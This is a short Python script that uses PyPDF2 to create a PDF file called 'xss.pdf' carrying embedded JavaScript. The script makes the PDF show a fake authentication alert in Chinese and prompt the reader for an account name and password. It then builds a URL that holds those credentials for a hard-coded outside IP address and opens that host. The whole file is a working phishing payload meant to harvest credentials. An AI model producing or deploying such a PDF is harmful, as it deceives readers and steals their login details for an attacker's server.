from PyPDF2 import PdfReader, PdfWriter
# 创建一个新的 PDF 文档
output_pdf = PdfWriter()
# 添加一个新页面
page = output_pdf.add_blank_page(width=72, height=72)
# 添加js代码
js_code = '''
app.alert("查看该文档需要进行身份验证\\n请先进行身份验证！");
var account = app.response("请输入账号：", "输入文本");
var password = app.response("请输入密码：", "输入文本");
var url = "http://43.133.61.41:10001/?account=" + encodeURIComponent(account) + "&password=" + encodeURIComponent(password);
app.launchURL("http://43.133.61.41:10001/");
'''
output_pdf.add_js(js_code)
# 将新页面写入到新 PDF 文档中
with open("xss.pdf", "wb") as f:
    output_pdf.write(f)